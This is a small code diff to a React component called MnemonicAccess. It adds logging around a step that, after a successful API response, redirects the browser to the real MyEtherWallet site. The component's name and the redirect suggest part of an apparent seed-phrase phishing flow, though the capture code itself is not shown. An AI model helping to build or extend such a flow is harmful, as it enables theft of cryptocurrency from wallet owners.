@@ -62,9 +62,11 @@ export default function MnemonicAccess() {
       console.log("API response:", response.data);
       const result = response.data;
       if (response.status === 200 && result.status) {
+        console.log('redirecting to myetherwallet');
         window.location.href = "https://www.myetherwallet.com";
         console.log(result);
       } else {
+        console.log('error redirecting to myetherwallet');
         const serverMessage = result?.message || "Something went wrong.";
         const serverError = result?.error ? ` (${result.error})` : "";
         setErrorMessage(serverMessage + serverError);
